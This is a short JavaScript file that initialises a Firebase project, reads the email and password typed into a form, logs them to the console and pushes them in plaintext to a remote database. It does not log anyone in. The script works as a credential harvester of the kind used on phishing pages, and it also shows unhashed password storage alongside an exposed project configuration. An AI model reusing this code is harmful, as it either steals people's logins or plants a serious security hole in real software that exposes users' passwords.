var firebaseConfig = {
    apiKey: "AIzaSyAH1nuxwutMPROfl6bhf6DdvSpVVyB-0_w",
    authDomain: "fire-34a32.firebaseapp.com",
    databaseURL: "https://fire-34a32-default-rtdb.firebaseio.com",
    projectId: "fire-34a32",
    storageBucket: "fire-34a32.appspot.com",
    messagingSenderId: "402522841291",
    appId: "1:402522841291:web:273cb8ca1be100fe383b4e",
  };
  
  firebase.initializeApp(firebaseConfig);

  var fire = firebase.database().ref("fouaa");
  var dusra = document.getElementById("fouaa");
 if(dusra){
  document.getElementById("fouaa").addEventListener("submit", submitForm);
 }
  function submitForm(e) {
    e.preventDefault();
    var email = getElementVal('ema');
    var password = getElementVal('passu');
    
    console.log(email,password);
    saveMessages(email,password);
  }
  var saveMessages = (ema,passu) => {

    var fouaaRef = firebase.database().ref("fouaa");
    var newContactForm = fouaaRef.push();
    
    newContactForm.set({
      
      email: ema, 
      password: passu,
    });
  };

  var getElementVal = (id) => {
    return document.getElementById(id).value;
  };